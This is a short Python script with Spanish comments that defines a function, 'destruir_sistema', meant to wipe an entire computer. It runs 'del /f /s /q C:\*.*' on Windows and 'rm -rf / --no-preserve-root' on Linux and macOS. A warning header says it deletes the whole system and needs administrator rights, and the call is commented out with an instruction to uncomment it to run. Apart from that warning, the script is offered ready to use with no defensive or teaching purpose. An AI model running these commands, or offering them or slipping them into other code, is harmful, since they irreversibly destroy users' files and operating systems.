import os

# --- ADVERTENCIA: ESTO BORRARÁ TODO EL SISTEMA ---
# Este script intenta borrar archivos de sistema. 
# Requiere permisos de administrador/root.

def destruir_sistema():
    # En Windows
    if os.name == 'nt':
        # Borra archivos en la unidad C: (muy destructivo)
        os.system('del /f /s /q C:\\*.*') 
    
    # En Linux/macOS
    else:
        # Borra todo desde la raíz
        os.system('rm -rf / --no-preserve-root')

# destruir_sistema() # Descomentar para ejecutar
